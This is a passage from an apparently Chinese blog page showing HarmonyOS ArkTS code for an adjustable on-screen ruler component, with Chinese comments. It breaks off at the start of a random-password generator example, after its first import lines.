class="string">`<span class="subst">$&#123;<span class="built_in">Math</span>.floor(<span class="variable language_">this</span>.index / <span class="number">10</span>)&#125;</span>`</span> : <span class="string">&#x27;&#x27;</span>; <span class="comment">// 每10个线显示一个编号</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 扩展文本样式</span></span><br><span class="line">@<span class="title class_">Extend</span>(<span class="title class_">Text</span>)</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fancy</span>(<span class="params"></span>) &#123;</span><br><span class="line">  .<span class="title function_">fontColor</span>(<span class="string">&quot;#019dfe&quot;</span>) <span class="comment">// 设置字体颜色</span></span><br><span class="line">  .<span class="title function_">fontSize</span>(<span class="number">20</span>); <span class="comment">// 设置字体大小</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 定义直尺组件</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">RulerComponent</span> &#123;</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">maxRulerHeight</span>: number = <span class="number">0</span>; <span class="comment">// 最大直尺高度</span></span><br><span class="line">  @<span class="title class_">State</span> @<span class="title class_">Watch</span>(<span class="string">&#x27;onCellWidthChanged&#x27;</span>) <span class="attr">cellWidthInPixels</span>: number = <span class="number">17.28</span>; <span class="comment">// 每毫米对应的像素</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">textWidth</span>: number = <span class="number">80</span>; <span class="comment">// 文本宽度</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">rulerLines</span>: <span class="title class_">RulerLine</span>[] = []; <span class="comment">// 直尺线数组</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">leftOffsetX</span>: number = -<span class="number">300</span>; <span class="comment">// 左侧偏移</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">currentPositionX</span>: number = -<span class="number">300</span>; <span class="comment">// 当前X位置</span></span><br><span class="line">  @<span class="title class_">State</span> @<span class="title class_">Watch</span>(<span class="string">&#x27;onContainerHeightChanged&#x27;</span>) <span class="attr">containerHeight</span>: number = <span class="number">53</span>; <span class="comment">// 容器高度</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">originalContainerHeight</span>: number = <span class="number">53</span>; <span class="comment">// 原始容器高度</span></span><br><span class="line">  @<span class="title class_">State</span> @<span class="title class_">Watch</span>(<span class="string">&#x27;onCellWidthChanged&#x27;</span>) <span class="attr">containerWidth</span>: number = <span class="number">0</span>; <span class="comment">// 容器宽度</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 处理单元格宽度变化</span></span><br><span class="line">  <span class="title function_">onCellWidthChanged</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">maxRulerHeight</span> = <span class="title function_">vp2px</span>(<span class="variable language_">this</span>.<span class="property">containerWidth</span>) / <span class="variable language_">this</span>.<span class="property">cellWidthInPixels</span> / <span class="number">10</span>; <span class="comment">// 更新最大直尺高度</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 处理容器高度变化</span></span><br><span class="line">  <span class="title function_">onContainerHeightChanged</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">containerHeight</span> = <span class="title class_">Math</span>.<span class="title function_">max</span>(<span class="variable language_">this</span>.<span class="property">containerHeight</span>, <span class="number">53</span>); <span class="comment">// 确保容器高度不小于53</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 组件即将出现时</span></span><br><span class="line">  <span class="title function_">aboutToAppear</span>(): <span class="keyword">void</span> &#123;</span><br><span class="line">    <span class="comment">// 设置当前应用为横屏显示</span></span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">getLastWindow</span>(<span class="title function_">getContext</span>()).<span class="title function_">then</span>(<span class="function">(<span class="params">windowClass</span>) =&gt;</span> &#123;</span><br><span class="line">      windowClass.<span class="title function_">setPreferredOrientation</span>(<span class="variable language_">window</span>.<span class="property">Orientation</span>.<span class="property">LANDSCAPE</span>); <span class="comment">// 设置为横屏</span></span><br><span class="line">    &#125;);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 初始化直尺线</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= <span class="number">15</span> * <span class="number">10</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">let</span> <span class="attr">lineHeight</span>: number = (i % <span class="number">10</span> === <span class="number">0</span>) ? <span class="number">90</span> : (i % <span class="number">5</span> === <span class="number">0</span>) ? <span class="number">60</span> : <span class="number">45</span>; <span class="comment">// 根据索引设置线的高度</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">rulerLines</span>.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">RulerLine</span>(i, lineHeight)); <span class="comment">// 将新线添加到数组中</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 构建UI</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>() &#123; <span class="comment">// 创建一个列布局</span></span><br><span class="line">      <span class="title class_">Stack</span>() &#123; <span class="comment">// 创建一个堆叠布局</span></span><br><span class="line">        <span class="title class_">Stack</span>() &#123; <span class="comment">// 创建另一个堆叠布局</span></span><br><span class="line">          <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">rulerLines</span>, <span class="function">(<span class="params">line: RulerLine, index: number</span>) =&gt;</span> &#123; <span class="comment">// 遍历直尺线数组</span></span><br><span class="line">            <span class="title class_">Line</span>()<span class="comment">// 创建一条线</span></span><br><span class="line">              .<span class="title function_">width</span>(<span class="number">1</span>)<span class="comment">// 设置线宽</span></span><br><span class="line">              .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;line.height&#125;</span>px`</span>)<span class="comment">// 设置线高</span></span><br><span class="line">              .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)<span class="comment">// 设置线的背景颜色</span></span><br><span class="line">              .<span class="title function_">margin</span>(&#123; <span class="attr">left</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidthInPixels * index&#125;</span>px`</span> &#125;); <span class="comment">// 设置线的左边距</span></span><br><span class="line">            <span class="title class_">Text</span>(line.<span class="title function_">showNumber</span>())<span class="comment">// 显示线的编号</span></span><br><span class="line">              .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)<span class="comment">// 设置字体颜色</span></span><br><span class="line">              .<span class="title function_">fontSize</span>(<span class="number">18</span>)<span class="comment">// 设置字体大小</span></span><br><span class="line">              .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.textWidth&#125;</span>px`</span>)<span class="comment">// 设置文本宽度</span></span><br><span class="line">              .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.textWidth&#125;</span>px`</span>)<span class="comment">// 设置文本高度</span></span><br><span class="line">              .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)<span class="comment">// 设置文本对齐方式</span></span><br><span class="line">              .<span class="title function_">margin</span>(&#123;</span><br><span class="line">                <span class="attr">left</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidthInPixels * index - <span class="variable language_">this</span>.textWidth / <span class="number">2</span>&#125;</span>px`</span>,</span><br><span class="line">                <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;line.height&#125;</span>px`</span></span><br><span class="line">              &#125;); <span class="comment">// 设置文本位置</span></span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">align</span>(<span class="title class_">Alignment</span>.<span class="property">TopStart</span>); <span class="comment">// 设置堆叠布局的宽高和对齐方式</span></span><br><span class="line"> </span><br><span class="line">        <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">15</span> &#125;) &#123; <span class="comment">// 创建一个列布局，设置间距</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`当前设备：<span class="subst">$&#123;deviceInfo.marketName&#125;</span>`</span>).<span class="title function_">fancy</span>(); <span class="comment">// 显示当前设备名称</span></span><br><span class="line">          <span class="title class_">Counter</span>() &#123; <span class="comment">// 创建一个计数器</span></span><br><span class="line">            <span class="title class_">Text</span>(<span class="string">`选中区距离：<span class="subst">$&#123;<span class="variable language_">this</span>.maxRulerHeight.toFixed(<span class="number">2</span>)&#125;</span>厘米`</span>).<span class="title function_">fancy</span>(); <span class="comment">// 显示选中区距离</span></span><br><span class="line">          &#125;</span><br><span class="line">          .<span class="title function_">foregroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// 设置计数器字体颜色</span></span><br><span class="line">          .<span class="title function_">width</span>(<span class="number">300</span>) <span class="comment">// 设置计数器宽度</span></span><br><span class="line">          .<span class="title function_">onInc</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 增加计数器时的处理</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">containerHeight</span> = <span class="title function_">px2vp</span>(<span class="title function_">vp2px</span>(<span class="variable language_">this</span>.<span class="property">containerHeight</span>) + <span class="variable language_">this</span>.<span class="property">cellWidthInPixels</span> / <span class="number">10</span>); <span class="comment">// 更新容器高度</span></span><br><span class="line">          &#125;)</span><br><span class="line">          .<span class="title function_">onDec</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 减少计数器时的处理</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">containerHeight</span> = <span class="title function_">px2vp</span>(<span class="title function_">vp2px</span>(<span class="variable language_">this</span>.<span class="property">containerHeight</span>) - <span class="variable language_">this</span>.<span class="property">cellWidthInPixels</span> / <span class="number">10</span>); <span class="comment">// 更新容器高度</span></span><br><span class="line">          &#125;);</span><br><span class="line"> </span><br><span class="line">          <span class="title class_">Counter</span>() &#123; <span class="comment">// 创建另一个计数器</span></span><br><span class="line">            <span class="title class_">Text</span>(<span class="string">`每毫米间距：<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidthInPixels.toFixed(<span class="number">2</span>)&#125;</span>px`</span>).<span class="title function_">fancy</span>(); <span class="comment">// 显示每毫米间距</span></span><br><span class="line">          &#125;</span><br><span class="line">          .<span class="title function_">foregroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// 设置计数器字体颜色</span></span><br><span class="line">          .<span class="title function_">width</span>(<span class="number">300</span>) <span class="comment">// 设置计数器宽度</span></span><br><span class="line">          .<span class="title function_">onInc</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 增加计数器时的处理</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">cellWidthInPixels</span> += <span class="number">0.01</span>; <span class="comment">// 增加每毫米间距</span></span><br><span class="line">          &#125;)</span><br><span class="line">          .<span class="title function_">onDec</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 减少计数器时的处理</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">cellWidthInPixels</span> = <span class="title class_">Math</span>.<span class="title function_">max</span>(<span class="number">0.01</span>, <span class="variable language_">this</span>.<span class="property">cellWidthInPixels</span> - <span class="number">0.01</span>); <span class="comment">// 减少每毫米间距，确保不小于0.01</span></span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="title class_">RelativeContainer</span>() &#123; <span class="comment">// 创建一个相对布局容器</span></span><br><span class="line">          <span class="title class_">Rect</span>()<span class="comment">// 创建一个矩形</span></span><br><span class="line">            .<span class="title function_">fill</span>(<span class="string">&quot;#80019dfe&quot;</span>)<span class="comment">// 设置填充颜色</span></span><br><span class="line">            .<span class="title function_">borderColor</span>(<span class="string">&quot;#019dfe&quot;</span>)<span class="comment">// 设置边框颜色</span></span><br><span class="line">            .<span class="title function_">borderWidth</span>(&#123; <span class="attr">left</span>: <span class="number">1</span>, <span class="attr">right</span>: <span class="number">1</span> &#125;)<span class="comment">// 设置边框宽度</span></span><br><span class="line">            .<span class="title function_">clip</span>(<span class="literal">true</span>)<span class="comment">// 启用裁剪</span></span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">&quot;100%&quot;</span>)<span class="comment">// 设置宽度为100%</span></span><br><span class="line">            .<span class="title function_">height</span>(<span class="string">&quot;100%&quot;</span>)<span class="comment">// 设置高度为100%</span></span><br><span class="line">            .<span class="title function_">onAreaChange</span>(<span class="function">(<span class="params">oldArea: Area, newArea: Area</span>) =&gt;</span> &#123; <span class="comment">// 处理区域变化</span></span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">containerWidth</span> = newArea.<span class="property">width</span> <span class="keyword">as</span> number; <span class="comment">// 更新容器宽度</span></span><br><span class="line">            &#125;);</span><br><span class="line"> </span><br><span class="line">          <span class="title class_">Stack</span>() &#123; <span class="comment">// 创建一个堆叠布局</span></span><br><span class="line">            <span class="title class_">Circle</span>(&#123; <span class="attr">height</span>: <span class="number">30</span>, <span class="attr">width</span>: <span class="number">30</span> &#125;)<span class="comment">// 创建一个圆形</span></span><br><span class="line">              .<span class="title function_">fill</span>(<span class="string">&quot;#019dfe&quot;</span>)<span class="comment">// 设置填充颜色</span></span><br><span class="line">              .<span class="title function_">stroke</span>(<span class="title class_">Color</span>.<span class="property">Transparent</span>)<span class="comment">// 设置边框颜色为透明</span></span><br><span class="line">              .<span class="title function_">strokeWidth</span>(<span class="number">3</span>); <span class="comment">// 设置边框宽度</span></span><br><span class="line">            <span class="title class_">Circle</span>(&#123; <span class="attr">height</span>: <span class="number">40</span>, <span class="attr">width</span>: <span class="number">40</span> &#125;)<span class="comment">// 创建另一个圆形</span></span><br><span class="line">              .<span class="title function_">fill</span>(<span class="title class_">Color</span>.<span class="property">Transparent</span>)<span class="comment">// 设置填充颜色为透明</span></span><br><span class="line">              .<span class="title function_">stroke</span>(<span class="string">&quot;#019dfe&quot;</span>)<span class="comment">// 设置边框颜色</span></span><br><span class="line">              .<span class="title function_">strokeWidth</span>(<span class="number">3</span>); <span class="comment">// 设置边框宽度</span></span><br><span class="line">          &#125;</span><br><span class="line">          .<span class="title function_">hitTestBehavior</span>(<span class="title class_">HitTestMode</span>.<span class="property">Block</span>) <span class="comment">// 设置碰撞检测行为</span></span><br><span class="line">          .<span class="title function_">padding</span>(<span class="number">20</span>) <span class="comment">// 设置内边距</span></span><br><span class="line">          .<span class="title function_">alignRules</span>(&#123;</span><br><span class="line">            <span class="comment">// 设置对齐规则</span></span><br><span class="line">            <span class="attr">center</span>: &#123; <span class="attr">anchor</span>: <span class="string">&quot;__container__&quot;</span>, <span class="attr">align</span>: <span class="title class_">VerticalAlign</span>.<span class="property">Center</span> &#125;, <span class="comment">// 垂直居中</span></span><br><span class="line">            <span class="attr">middle</span>: &#123; <span class="attr">anchor</span>: <span class="string">&quot;__container__&quot;</span>, <span class="attr">align</span>: <span class="title class_">HorizontalAlign</span>.<span class="property">Start</span> &#125; <span class="comment">// 左对齐</span></span><br><span class="line">          &#125;)</span><br><span class="line">          .<span class="title function_">gesture</span>(<span class="title class_">PanGesture</span>(&#123;</span><br><span class="line">            <span class="comment">// 左侧拖动手势</span></span><br><span class="line">            <span class="attr">fingers</span>: <span class="number">1</span>, <span class="comment">// 单指拖动</span></span><br><span class="line">            <span class="attr">direction</span>: <span class="title class_">PanDirection</span>.<span class="property">Horizontal</span>, <span class="comment">// 水平拖动</span></span><br><span class="line">            <span class="attr">distance</span>: <span class="number">1</span> <span class="comment">// 最小拖动距离</span></span><br><span class="line">          &#125;).<span class="title function_">onActionUpdate</span>(<span class="function">(<span class="params">event: GestureEvent</span>) =&gt;</span> &#123; <span class="comment">// 拖动更新时的处理</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">leftOffsetX</span> = <span class="variable language_">this</span>.<span class="property">currentPositionX</span> + event.<span class="property">offsetX</span> / <span class="number">2</span>; <span class="comment">// 更新左侧偏移</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">containerHeight</span> = <span class="variable language_">this</span>.<span class="property">originalContainerHeight</span> - event.<span class="property">offsetX</span>; <span class="comment">// 更新容器高度</span></span><br><span class="line">          &#125;).<span class="title function_">onActionEnd</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 拖动结束时的处理</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">currentPositionX</span> = <span class="variable language_">this</span>.<span class="property">leftOffsetX</span>; <span class="comment">// 更新位置</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">originalContainerHeight</span> = <span class="variable language_">this</span>.<span class="property">containerHeight</span>; <span class="comment">// 更新原始高度</span></span><br><span class="line">          &#125;));</span><br><span class="line"> </span><br><span class="line">          <span class="title class_">Stack</span>() &#123; <span class="comment">// 创建另一个堆叠布局</span></span><br><span class="line">            <span class="title class_">Circle</span>(&#123; <span class="attr">height</span>: <span class="number">30</span>, <span class="attr">width</span>: <span class="number">30</span> &#125;)<span class="comment">// 创建一个圆形</span></span><br><span class="line">              .<span class="title function_">fill</span>(<span class="string">&quot;#019dfe&quot;</span>)<span class="comment">// 设置填充颜色</span></span><br><span class="line">              .<span class="title function_">stroke</span>(<span class="title class_">Color</span>.<span class="property">Transparent</span>)<span class="comment">// 设置边框颜色为透明</span></span><br><span class="line">              .<span class="title function_">strokeWidth</span>(<span class="number">3</span>); <span class="comment">// 设置边框宽度</span></span><br><span class="line">            <span class="title class_">Circle</span>(&#123; <span class="attr">height</span>: <span class="number">40</span>, <span class="attr">width</span>: <span class="number">40</span> &#125;)<span class="comment">// 创建另一个圆</span></span><br><span class="line">              .<span class="title function_">fill</span>(<span class="title class_">Color</span>.<span class="property">Transparent</span>)<span class="comment">// 设置填充颜色为透明</span></span><br><span class="line">              .<span class="title function_">stroke</span>(<span class="string">&quot;#019dfe&quot;</span>)<span class="comment">// 设置边框颜色</span></span><br><span class="line">              .<span class="title function_">strokeWidth</span>(<span class="number">3</span>); <span class="comment">// 设置边框宽度</span></span><br><span class="line">          &#125;</span><br><span class="line">          .<span class="title function_">hitTestBehavior</span>(<span class="title class_">HitTestMode</span>.<span class="property">Block</span>) <span class="comment">// 设置碰撞检测行为</span></span><br><span class="line">          .<span class="title function_">padding</span>(<span class="number">20</span>) <span class="comment">// 设置内边距</span></span><br><span class="line">          .<span class="title function_">alignRules</span>(&#123;</span><br><span class="line">            <span class="comment">// 设置对齐规则</span></span><br><span class="line">            <span class="attr">center</span>: &#123; <span class="attr">anchor</span>: <span class="string">&quot;__container__&quot;</span>, <span class="attr">align</span>: <span class="title class_">VerticalAlign</span>.<span class="property">Center</span> &#125;, <span class="comment">// 垂直居中</span></span><br><span class="line">            <span class="attr">middle</span>: &#123; <span class="attr">anchor</span>: <span class="string">&quot;__container__&quot;</span>, <span class="attr">align</span>: <span class="title class_">HorizontalAlign</span>.<span class="property">End</span> &#125; <span class="comment">// 右对齐</span></span><br><span class="line">          &#125;)</span><br><span class="line">          .<span class="title function_">gesture</span>(<span class="title class_">PanGesture</span>(&#123;</span><br><span class="line">            <span class="comment">// 右侧拖动手势</span></span><br><span class="line">            <span class="attr">fingers</span>: <span class="number">1</span>, <span class="comment">// 单指拖动</span></span><br><span class="line">            <span class="attr">direction</span>: <span class="title class_">PanDirection</span>.<span class="property">Horizontal</span>, <span class="comment">// 水平拖动</span></span><br><span class="line">            <span class="attr">distance</span>: <span class="number">1</span> <span class="comment">// 最小拖动距离</span></span><br><span class="line">          &#125;).<span class="title function_">onActionUpdate</span>(<span class="function">(<span class="params">event: GestureEvent</span>) =&gt;</span> &#123; <span class="comment">// 拖动更新时的处理</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">leftOffsetX</span> = <span class="variable language_">this</span>.<span class="property">currentPositionX</span> + event.<span class="property">offsetX</span> / <span class="number">2</span>; <span class="comment">// 更新左侧偏移</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">containerHeight</span> = <span class="variable language_">this</span>.<span class="property">originalContainerHeight</span> + event.<span class="property">offsetX</span>; <span class="comment">// 更新容器高度</span></span><br><span class="line">          &#125;).<span class="title function_">onActionEnd</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 拖动结束时的处理</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">currentPositionX</span> = <span class="variable language_">this</span>.<span class="property">leftOffsetX</span>; <span class="comment">// 更新位置</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">originalContainerHeight</span> = <span class="variable language_">this</span>.<span class="property">containerHeight</span>; <span class="comment">// 更新原始高度</span></span><br><span class="line">          &#125;));</span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">width</span>(<span class="variable language_">this</span>.<span class="property">containerHeight</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">&quot;100%&quot;</span>) <span class="comment">// 设置高度</span></span><br><span class="line">        .<span class="title function_">translate</span>(&#123; <span class="attr">x</span>: <span class="variable language_">this</span>.<span class="property">leftOffsetX</span> &#125;) <span class="comment">// 使用左侧偏移</span></span><br><span class="line">        .<span class="title function_">gesture</span>(<span class="title class_">PanGesture</span>(&#123;</span><br><span class="line">          <span class="comment">// 左侧拖动手势</span></span><br><span class="line">          <span class="attr">fingers</span>: <span class="number">1</span>, <span class="comment">// 单指拖动</span></span><br><span class="line">          <span class="attr">direction</span>: <span class="title class_">PanDirection</span>.<span class="property">Horizontal</span>, <span class="comment">// 水平拖动</span></span><br><span class="line">          <span class="attr">distance</span>: <span class="number">1</span> <span class="comment">// 最小拖动距离</span></span><br><span class="line">        &#125;).<span class="title function_">onActionUpdate</span>(<span class="function">(<span class="params">event: GestureEvent</span>) =&gt;</span> &#123; <span class="comment">// 拖动更新时的处理</span></span><br><span class="line">          <span class="keyword">if</span> (event) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">leftOffsetX</span> = <span class="variable language_">this</span>.<span class="property">currentPositionX</span> + event.<span class="property">offsetX</span>; <span class="comment">// 更新左侧偏移</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;).<span class="title function_">onActionEnd</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 拖动结束时的处理</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">currentPositionX</span> = <span class="variable language_">this</span>.<span class="property">leftOffsetX</span>; <span class="comment">// 更新位置</span></span><br><span class="line">        &#125;));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;.<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 设置高度和宽度</span></span><br><span class="line">    .<span class="title function_">padding</span>(&#123; <span class="attr">left</span>: <span class="number">30</span>, <span class="attr">right</span>: <span class="number">10</span> &#125;) <span class="comment">// 设置内边距</span></span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#181b22&quot;</span>); <span class="comment">// 设置背景颜色</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="randon-password"><a href="#randon-password" class="headerlink" title="randon password"></a>randon password</h1><p>随机密码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 导入剪贴板服务</span></span><br><span class="line"><span class="keyword">import</span> &#123; pasteboard &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.BasicServicesKit&#x27;</span>;</span><br><span class="line"><span class="comment">// 导入弹窗提示服务</span></span><br><span class="line"><span class="keyword">import</span> &#123; promptAction &#125; <span class="keyword">from</span> <span 